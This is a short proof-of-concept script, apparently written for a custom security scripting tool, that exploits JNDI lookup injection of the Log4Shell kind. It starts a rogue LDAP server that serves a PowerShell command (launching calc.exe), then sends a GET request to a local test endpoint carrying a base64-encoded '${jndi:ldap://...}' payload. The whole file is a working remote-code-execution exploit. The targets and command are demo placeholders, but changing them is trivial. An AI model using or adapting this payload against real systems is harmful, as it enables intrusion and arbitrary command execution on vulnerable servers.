#include "ldap"
#include "tool"
#include "http"
#include "base64"

// start server
ldapPort = 1389;
httpPort = 8888;
cmd = tool::getPowershellCommand("calc.exe");
ldap::startServer(ldapPort,httpPort,cmd);

// POC
headers = newMap();
putMap(headers,"User-Agent","4ra1n");
url = "http://127.0.0.1:8080/test?message=";
payload = "${jndi:ldap://127.0.0.1:1389/cmd}";
payload = base64::encode(payload);
url = url + payload;
response = http::doGet(url,headers);
